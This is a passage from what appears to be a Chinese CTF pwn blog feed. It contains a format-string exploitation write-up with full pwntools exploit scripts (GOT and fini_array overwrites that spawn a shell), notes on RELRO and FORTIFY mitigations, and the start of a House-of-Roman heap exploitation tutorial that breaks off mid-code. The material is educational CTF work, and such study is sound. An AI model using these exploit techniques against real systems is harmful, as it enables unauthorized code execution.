class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span></span><br><span class="line">Nice <span class="keyword">to</span> meet you, aaaa<span class="number">0x80487d0</span>..<span class="number">0xffa5f54c</span>..(nil)..(nil)..(nil)..(nil)..<span class="number">0x6563694e</span>..<span class="number">0x206f7420</span>..<span class="number">0x7465656d</span>..<span class="number">0x756f7920</span>..<span class="number">0x6161202c</span>..<span class="number">0x70256161</span>..<span class="number">0x70252e2e</span>..<span class="number">0x70252e2e</span>..<span class="number">0x70252e2e</span>. :)</span><br></pre></td></tr></table></figure><p>发现 0x70256161 6161 是我们 的输入的a！显然没有对齐，我们在aaaa前面再加2a，于是<br>我们发送aaaaaa%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, I'm nao!</span><br><span class="line">Please tell me your name... aaaaaa<span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span></span><br><span class="line">Nice <span class="keyword">to</span> meet you, aaaaaa<span class="number">0x80487d0</span>..<span class="number">0xffb9e0bc</span>..(nil)..(nil)..(nil)..(nil)..<span class="number">0x6563694e</span>..<span class="number">0x206f7420</span>..<span class="number">0x7465656d</span>..<span class="number">0x756f7920</span>..<span class="number">0x6161202c</span>..<span class="number">0x61616161</span>..<span class="number">0x2e2e7025</span>..<span class="number">0x2e2e7025</span>..% :)#</span><br></pre></td></tr></table></figure><p>发现是12偏移<br>aaaaaa的后四个a 的偏移 是 12  对应于 下面exp 中payload 中的 p32(fini_array) 位置处</p><p>其中  exp 中  %hn  是以 两字节  写入。<br>这里 之所以  payload 最开始 会 对 +18 感到 疑惑，其实 这是 因为   sprintf(&amp;s, “Nice to meet you, %s :)\n”, &amp;v5);    //格式化字符串漏洞   首先 会输出  18 字节的 格式化字符串。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">conn=process('./greeting')</span><br><span class="line">elf=ELF('./greeting')</span><br><span class="line">fini_array=0x08049934         <span class="comment">#readelf -S greeting</span></span><br><span class="line">start=0x080484f0          <span class="comment">#   ida  看的更方便嘛！</span></span><br><span class="line">system_plt=0x8048490         </span><br><span class="line">strlen_got=elf.got['strlen']</span><br><span class="line"><span class="comment">#print "strlen_got: "+hex(strlen_got)</span></span><br><span class="line"><span class="comment">#print "system_plt: "+hex(system_plt)</span></span><br><span class="line"><span class="comment">#print "fini_array: "+hex(fini_array)</span></span><br><span class="line"><span class="comment">#print "start: "+hex(start)</span></span><br><span class="line">conn.recv()</span><br><span class="line">payload='aa'+p32(fini_array)+p32(strlen_got+2)  <span class="comment">#18+2+4+4</span></span><br><span class="line">payload+=p32(strlen_got)+'%34000c%12$hn'        <span class="comment"># +4+34000=0x84f0</span></span><br><span class="line">payload+='%33556c%13$hn'                     <span class="comment">#0x84f0+33556=0x10804 截断=0x0804</span></span><br><span class="line">payload+='%31884c%14$hn'                     <span class="comment">#0x10804+31884=0x18049 截断=0x8049</span></span><br><span class="line">conn.sendline(payload)  <span class="comment">#此时已 一次性将 fini_array-&gt;start   strlen_got-&gt;system_plt</span></span><br><span class="line">conn.recv()                     <span class="comment">#程序重新运行了，接受Please tell me your name...</span></span><br><span class="line">conn.sendline('/bin/sh\x00')</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>成功 getshell：<br><img src="https://s1.ax1x.com/2020/03/26/8zp1KS.png" alt="8zp1KS.png"></p><p>然后 最后 我再 说下 这题吧！<br>也是个  格式化字符串 任意写的 一个题型。</p><h1 id="BJDCTF-2nd-Pwn-r2t4"><a href="#BJDCTF-2nd-Pwn-r2t4" class="headerlink" title="BJDCTF 2nd - Pwn_r2t4"></a>BJDCTF 2nd - Pwn_r2t4</h1><p>这个程序 是 64位 并开启了  Canary保护的elf 文件，三天前比赛真题，还热乎着呢。</p><p>程序流程也很简单，输入什么 就输出 什么。当然这里是一个   很明显的 格式化字符串漏洞。<br>并程序 只运行  一遍，且含有 后门函数。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]                       </span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x38</span>uLL);             <span class="comment">//存在栈溢出 漏洞，但有canary 保护，虽然可通过任意地址写 可泄露canary，但程序只运行 一边。</span></span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  system(<span class="string">"cat flag"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面代码中的注释可知，栈溢出的方法  不可取， 因为程序开启了Canary   当函数返回的时候  会比较canary的 值 是否发生变化，如果不一致，就触发 __stack_chk_fail 函数。且程序中 含有后门函数。<br>我们可通过格式化字符串写  将backdoor_addr写入  __stack_chk_fail_got 中<br>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./r2t4"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26640</span>)</span><br><span class="line">elf=ELF(<span class="string">"./r2t4"</span>)</span><br><span class="line">offset=<span class="number">6</span></span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">backdoor=<span class="number">0x400626</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">__stack_chk_fail is 0x601018</span></span><br><span class="line"><span class="string">backdoor is 0x400626</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"__stack_chk_fail is "</span>+hex(__stack_chk_fail)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"backdoor is "</span>+hex(backdoor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">"a"</span>+<span class="string">"%"</span>+str(backdoor<span class="number">-1</span>)+<span class="string">"c%8$lln"</span>+p64(__stack_chk_fail)<span class="comment">#  0x30</span></span><br><span class="line">payload+=(<span class="number">0x30</span><span class="number">-8</span>-len(payload))*<span class="string">'a'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,"b main")</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>成功 getshell</p><p><img src="https://s1.ax1x.com/2020/03/26/8zp8bQ.png" alt="8zp8bQ.png"></p><p>最后最后简单 说下 </p><h1 id="和格式化字符串漏洞相关的漏洞缓解机制"><a href="#和格式化字符串漏洞相关的漏洞缓解机制" class="headerlink" title="和格式化字符串漏洞相关的漏洞缓解机制"></a>和格式化字符串漏洞相关的漏洞缓解机制</h1><p>这部分建议 阅读 下面参考链接吧。<br>参考链接：<br><a href="https://bbs.ichunqiu.com/thread-43624-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43624-1-1.html</a><br>我们在checksec 程序的时候中 的RELRO 项：<br>RELRO是重定位表只读（Relocation Read Only）的缩写，即plt 和got 表，</p><ol><li>如果 这项的 内容 为  No RELRO的话  就代表  重定位表 不是仅可读的，我们在 漏洞利用的时候 可 优先考虑  修改某个函数的 got 表项，去达到 getshell 的目的。</li><li>如果  “其RELRO项为Partial RELRO 即该程序的重定位表项全部只读，无论是.got还是.got.plt都无法修改。改got表，程序不会报错，但是数据未被修改，</li><li>而如果 程序开启了Full RELRO保护之后，包括格式化字符串漏洞在内，试图通过漏洞劫持got表的行为都将会被阻止。</li><li>如果 是FORTIFY，这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。简单地说，加了这个保护之后（编译时加上参数-D_FORTIFY_SOURCE=2）一些敏感函数如read, fgets, memcpy, printf等等可能导致漏洞出现的函数都会被替换成<strong>read_chk, __fgets_chk, __memcpy_chk,</strong>printf_chk等。这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，通过检查·诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。开启了FORTIFY保护的程序会被checksec检出，此外，在反汇编时直接查看got表也会发现chk函数的存在</li></ol><p>其实 ，不得说下 我对最后一个 FORTIFY ，还没怎么接触到。经验 太少！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里记录了 常见格式化字符串的漏洞的知识和利用。（注，关于bss 段上的格式化字符串 忘记写了，回头补充下！）&lt;/p&gt;
    
    </summary>
    
    
      <category term="PWN总结" scheme="http://yoursite.com/tags/PWN%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>House-Of-Roman技术分析及例题新解</title>
    <link href="http://yoursite.com/2020/04/19/House-Of-Roman%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E5%8F%8A%E4%BE%8B%E9%A2%98%E6%96%B0%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/04/19/House-Of-Roman技术分析及例题新解/</id>
    <published>2020-04-19T09:16:59.000Z</published>
    <updated>2020-04-19T09:17:32.049Z</updated>
    
    <content type="html"><![CDATA[<p>停更了快小半年了，罪过呐，重新捡起。最近要努力学堆！！！文章首发于 先知社区。</p><a id="more"></a><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attachk 结合的一个小 trick。<br>该技术用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的。<br>且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。<br> （以来自 ctf wiki）<br>我在学习这部分的 时候 很是迷惑，经过寻找参考资料与自己对该例题长达 一天的时间的调试终于搞懂了了，特记录下来加深对它的理解。<br>该程序可以在这里下载到。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/romanking98/</span>House-Of-Roman</span><br></pre></td></tr></table></figure><h1 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h1><p>总体上来说  我们 分为五大步：</p><ol><li>通过低位地址写修改fastbin的fd，修改到malloc_hook-0x23，为我们最后 向 malloc_hook地址里写入 one_gadget 做准备</li><li>修复 fastbin free 链</li><li>通过unsortedbin attack，将main_arean地址写入malloc_hook</li><li>通过低位地址写修改malloc_hook中的地址为one gadget</li><li>free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。<h1 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h1>我们检查下保护：</li></ol><p><img src="https://s1.ax1x.com/2020/03/20/86BoxU.png" alt="86BoxU.png"></p><p>开启了 PIE 和 NX保护。<br>为了本地调试方便 我们关闭 本地ASLR </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space</span><br></pre></td></tr></table></figure><p>我们先来看下程序逻辑：<br>首先让我们 输入 name 到bss 段上，然后 是个菜单，有三个功能    </p><ol><li>Malloc  2. Write   3. Free</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 choice; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  start_p();                                    <span class="comment">// Enter name :</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;choice);              <span class="comment">// 1. Malloc</span></span><br><span class="line">                                                <span class="comment">// 2. Write</span></span><br><span class="line">                                                <span class="comment">// 3. Free</span></span><br><span class="line">    <span class="keyword">switch</span> ( (_DWORD)choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Malloc"</span>);</span><br><span class="line">        HIDWORD(choice) = (<span class="keyword">unsigned</span> __int64)Malloc();</span><br><span class="line">        <span class="keyword">if</span> ( !HIDWORD(choice) )</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Error"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Write"</span>);</span><br><span class="line">        Write(<span class="string">"Write"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Free"</span>);</span><br><span class="line">        Free(<span class="string">"Free"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.MAlloc： maloc的参数 size 并没有限制 大小</p><p>且在 经过gdb 调试：知道 heap_ptr[0]的地址</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">heap_ptrs[0] ：0x555555756160</span><br><span class="line"> <span class="function"><span class="keyword">#</span><span class="title">malloc</span><span class="params">(<span class="variable">size</span>)</span></span> : 0x5555557549b8</span><br></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc_chunk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *chunk_mem_addr; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp-Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter size of chunk :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;<span class="built_in">size</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter index :"</span>, &amp;<span class="built_in">size</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x13</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk_mem_addr = <span class="built_in">malloc</span>(<span class="built_in">size</span>);              <span class="comment">// size 无限制</span></span><br><span class="line">    v4 = chunk_mem_addr;</span><br><span class="line">    heap_ptrs[v2] = chunk_mem_addr;</span><br><span class="line">    sizes[v2] = <span class="built_in">size</span>;</span><br><span class="line">    result = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.Write：存在单字节 溢出漏洞</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> Write()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 <span class="keyword">id</span>; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  printf(<span class="string">"\nEnter index of chunk :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;<span class="keyword">id</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="keyword">id</span> &gt; <span class="number">0x13</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">"\nInvalid index"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !heap_ptrs[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="keyword">id</span>] )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">"Bad index"</span>);</span><br><span class="line">  HIDWORD(<span class="keyword">id</span>) = sizes[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="keyword">id</span>];</span><br><span class="line">  printf(<span class="string">"Enter data :"</span>, &amp;<span class="keyword">id</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="keyword">void</span> *)heap_ptrs[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="keyword">id</span>], HIDWORD(<span class="keyword">id</span>) + <span class="number">1</span>);<span class="comment">// off by one</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>Free 这里free 后 并没有将 指针 置为 NULL，存在UAF 漏洞。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp-4h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nEnter index :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x13</span> )</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)heap_ptrs[v0]);  <span class="comment">//UAF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><p>House-Of-Roman</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.通过低位地址写修改fastbin的fd，修改到malloc_hook<span class="number">-0</span><span class="keyword">x</span><span class="number">23</span>，为我们最后 向 malloc_hook地址里写入 one_gadget 做准备</span><br><span class="line"><span class="number">2</span>.修复过程中的fastbin，</span><br><span class="line"><span class="number">3</span>.通过unsortedbin attack，将main_arean地址写入malloc_hook</span><br><span class="line"><span class="number">4</span>.通过低位地址写修改malloc_hook中的地址为<span class="keyword">one</span> gadget</span><br><span class="line"><span class="number">5</span>.<span class="keyword">free</span> 同一个 chunk 多次，造成 <span class="keyword">double</span> <span class="keyword">free</span> 异常，触发 malloc_printerr ，触发<span class="keyword">malloc</span>,getshell。</span><br></pre></td></tr></table></figure><p>第一步:<br>通过低位地址写修改fastbin的fd，修改到malloc_hook-0x23，为我们最后 向 malloc_hook地址里写入 one_gadget 做准备</p><p>我们将这步 给细化下吧。<br>首先 进行堆内存布局，<br>即申请 3个 chunk ，heap_ptrs[0]， heap_ptrs[1]， heap_ptrs[2] ，</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0x18</span>,<span class="number">0</span>) # heap_ptrs[<span class="number">0</span>]      #off_by_one 可修改 heap_ptrs[<span class="number">1</span>] chunk 的size，为后面做准备</span><br><span class="line">malloc(<span class="number">0xc0</span>,<span class="number">1</span>) # heap_ptrs[<span class="number">1</span>]      #通过低位地址写修改 fastbin(heap_ptrs[<span class="number">1</span>]对应的chunk size 为 <span class="number">0x70</span>)的fd，</span><br><span class="line">                                    #修改到malloc_hook<span class="number">-0x23</span>.</span><br><span class="line">malloc(<span class="number">0x60</span>,<span class="number">2</span>) # heap_ptrs[<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/20/86BmDJ.png" alt="86BmDJ.png"><br>在 heap_ptrs[1] 对应的chunk_addr+0x78 处 伪造  size，为后面的攻击做准备。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake = <span class="string">"A"</span>*0x68</span><br><span class="line">fake += p64(0x61)  <span class="comment"># fake size</span></span><br><span class="line">write(1,fake)</span><br></pre></td></tr></table></figure><p>然后将  heap_ptrs[1] 对应的chunk free进 unsigned bin中，于是 heap_ptrs[1] 对应的chunk 的chunk的 fd (+0x10)与 bk(+0x18) 处都为 main_arena+88 （ 0x7ffff7dd1b78 ）<br><br><img src="https://s1.ax1x.com/2020/03/20/86Bnb9.png" alt="86Bnb9.png"><br>然后接着 申请 3个 chunk，heap_ptrs[3]（与heap_ptrs[2]同大小）， heap_ptrs[15]， heap_ptrs[18] ，并同时 通过单字节溢出将 heap_ptrs[1]的size  也给覆盖成 0x71(70+1)<br>其中，<br>heap_ptrs[15] 用于后面 修复 fast bin链<br>heap_ptrs[18] 0x555555756160（ heap_ptrs[0] ）+0x8*18  即0x555555757250    用于 最后一步 double free 这个 chunk。<br>heap_ptrs[3]  把它与 heap_ptrs[2] 先后 给free 掉，放入 0x70 大小的 fast bin中注意下此时的 bin的结构）<br>即 heap_ptrs[3] 对应的chunk的fd(+0x10)指向了 heap_ptrs[2] 对应的chunk</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">free</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">free</span><span class="params">(<span class="number">3</span>)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/20/86BMU1.png" alt="86BMU1.png"><br>因为此时 heap_ptrs[1]对应的chunk 的fd（+0x10）指向的地址是  main_arena+88 （ 0x7ffff7dd1b78 ），我们可以 修改 heap_ptrs[3]为 heap_ptrs[1]对应的chunk_addr:（通过单字节 写 实现）,</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">over</span> = <span class="string">"\x20"</span></span><br><span class="line"><span class="built_in">write</span>(<span class="number">3</span>,<span class="keyword">over</span>)</span><br></pre></td></tr></table></figure><p>从而 heap_ptrs[3] 对应的chunk的fd(+0x10)指向了 heap_ptrs[1] 对应的chunk， heap_ptrs[1] 对应的chunk 的fd(+0x10)指向了  main_arena+88 （ 0x7ffff7dd1b78 ）<br><img src="https://s1.ax1x.com/2020/03/20/86BKER.png" alt="86BKER.png"><br><br><br>然后 再 通过低位地址写修改 fastbin（ heap_ptrs[1] 对应的chunk size 为 0x70）的fd，修改到malloc_hook-0x23.<br><img src="https://s1.ax1x.com/2020/03/20/86Beu4.png" alt="86Beu4.png"></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 